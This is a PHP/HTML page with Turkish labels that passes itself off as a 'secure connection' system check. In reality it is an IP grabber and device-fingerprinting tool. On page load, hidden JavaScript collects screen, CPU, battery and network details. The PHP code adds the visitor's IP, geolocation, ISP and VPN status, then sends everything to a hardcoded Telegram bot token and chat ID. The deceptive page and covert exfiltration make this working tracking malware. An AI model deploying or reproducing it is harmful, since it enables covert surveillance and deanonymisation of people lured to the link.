<?php
// --- TELEGRAM BİLGİLERİN ---
$token = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
$chat_id = "6845229845";
// -----------------------------------------

// 1. IP Adresini Al
$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && filter_var($_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP)) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

// 2. IP Üzerinden Detaylı Konum Bilgisi (ip-api.com)
$api_url = "http://ip-api.com/json/" . $ip . "?fields=status,country,regionName,city,isp,org,mobile,proxy";
$api_ch = curl_init();
curl_setopt($api_ch, CURLOPT_URL, $api_url);
curl_setopt($api_ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($api_ch, CURLOPT_TIMEOUT, 3);
$api_response = curl_exec($api_ch);
curl_close($api_ch);

$konum_bilgisi = json_decode($api_response, true);

$ulke = "Bilinmiyor";
$eyalet_sehir = "Bilinmiyor";
$internet_sirketi = "Bilinmiyor";
$mobil_mi = "Bilinmiyor";
$vpn_proxy = "Temiz (Yok)";

if ($konum_bilgisi && $konum_bilgisi['status'] == 'success') {
    $ulke = $konum_bilgisi['country'];
    $eyalet_sehir = $konum_bilgisi['regionName'] . " / " . $konum_bilgisi['city'];
    $internet_sirketi = $konum_bilgisi['isp'];
    $mobil_mi = $konum_bilgisi['mobile'] ? "Evet (Mobil Veri)" : "Hayır (Ev/İş İnterneti)";
    $vpn_proxy = $konum_bilgisi['proxy'] ? "⚠️ Evet (VPN/Proxy!)" : "Temiz (Doğal)";
}

// 3. Kullanıcı İşletim Sistemini Çözme
$tarayici = $_SERVER['HTTP_USER_AGENT'];
$os_surumu = "Bilinmeyen Sistem";

if (preg_match('/Android\s([0-9\.]+)/', $tarayici, $matches)) {
    $os_surumu = "Android " . $matches[1];
} elseif (preg_match('/iPhone\sOS\s([0-9_]+)/', $tarayici, $matches)) {
    $os_surumu = "iOS " . str_replace('_', '.', $matches[1]);
} elseif (preg_match('/Windows\sNT\s([0-9\.]+)/', $tarayici, $matches)) {
    $os_surumu = "Windows NT " . $matches[1];
} elseif (preg_match('/Macintosh;', $tarayici)) {
    $os_surumu = "macOS";
} elseif (preg_match('/Linux/', $tarayici)) {
    $os_surumu = "Linux";
}

$dil = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE'])[0] : 'Bilinmiyor';
$tarih = date("Y-m-d H:i:s");

// Kararlı cURL Gönderim Fonksiyonu
function telegram_gonder($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // SSL engelini aşar
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// JavaScript'ten gelen teknik verileri yakalayıp Telegram'a gönderen kısım
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['js_data'])) {
    $js = json_decode($_POST['js_data'], true);
    
    $mesaj = "🥷 *YENİ SİSTEM LOGU YAKALANDI*\n";
    $mesaj .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $mesaj .= "🌐 *IP Adresi:* `$ip`\n";
    $mesaj .= "🤖 *OS / Sistem:* $os_surumu\n";
    $mesaj .= "🌍 *Dil / Tarih:* $dil | $tarih\n";
    $mesaj .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $mesaj .= "📍 *Konum:* $ulke - $eyalet_sehir\n";
    $mesaj .= "🏢 *Sağlayıcı:* $internet_sirketi\n";
    $mesaj .= "📶 *Bağlantı:* $mobil_mi\n";
    $mesaj .= "🛡️ *VPN Durumu:* $vpn_proxy\n";
    $mesaj .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $mesaj .= "📊 *Cihaz Teknik Detayları (JS):*\n";
    $mesaj .= "🖥️ *Çözünürlük:* " . ($js['ekran'] ?? 'Bilinmiyor') . "\n";
    $mesaj .= "🧠 *İşlemci:* " . ($js['cekirdek'] ?? 'Bilinmiyor') . " Çekirdek\n";
    $mesaj .= "🔋 *Pil Seviyesi:* " . ($js['pil'] ?? 'Bilinmiyor') . "\n";
    $mesaj .= "⚡ *Ağ Hızı / Tip:* " . ($js['hiz'] ?? 'Bilinmiyor') . " [" . ($js['net_tip'] ?? 'Bilinmiyor') . "]\n";
    $mesaj .= "🌐 *Tarayıcı:* " . ($js['tarayici'] ?? 'Bilinmiyor') . "\n";
    $mesaj .= "━━━━━━━━━━━━━━━━━━━━━━";

    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($mesaj) . "&parse_mode=Markdown";
    telegram_gonder($url);
    exit; 
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrolü</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .terminal {
            width: 90%;
            max-width: 500px;
            padding: 20px;
            border: 1px solid #00ff66;
            background: #111;
            box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
            border-radius: 5px;
        }
        .loader {
            display: inline-block;
            width: 15px;
            height: 15px;
            border: 2px solid #111;
            border-radius: 50%;
            border-top-color: #00ff66;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .line { margin: 8px 0; font-size: 14px; opacity: 0; animation: fadeIn 0.5s forwards; }
        @keyframes fadeIn { to { opacity: 1; } }
    </style>
</head>
<body>

    <div class="terminal">
        <div style="display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px;">
            <div class="loader"></div>
            <span style="font-weight: bold;">SECURE_CONNECT_MODULE v2.4</span>
        </div>
        <div class="line" style="animation-delay: 0.2s;">⚡ Protokol başlatılıyor...</div>
        <div class="line" style="animation-delay: 0.6s;">📡 Sunucu kimliği doğrulanıyor...</div>
        <div class="line" style="animation-delay: 1.1s;">🔒 Güvenli tünel kuruldu.</div>
        <div class="line" style="animation-delay: 1.5s; color: #888;">Lütfen bekleyin, yönlendiriliyorsunuz...</div>
    </div>

    <script>
        window.onload = async function() {
            let pil_durumu = "Bilinmiyor";
            if (navigator.getBattery) {
                try {
                    let battery = await navigator.getBattery();
                    pil_durumu = Math.round(battery.level * 100) + "% " + (battery.charging ? "(Şarjda)" : "(Deşarj)");
                } catch (e) {}
            }

            let data = {
                ekran: window.screen.width + "x" + window.screen.height,
                cekirdek: navigator.hardwareConcurrency || "Bilinmiyor",
                hiz: navigator.connection ? navigator.connection.downlink + " Mbps" : "Bilinmiyor",
                net_type: navigator.connection ? navigator.connection.effectiveType : "Bilinmiyor",
                pil: pil_durumu,
                tarayici: navigator.userAgent.substring(navigator.userAgent.lastIndexOf('/') - 10)
            };

            let formData = new FormData();
            formData.append('js_data', JSON.stringify(data));

            fetch(window.location.href, {
                method: 'POST',
                body: formData
            });
        };
    </script>
</body>
</html>
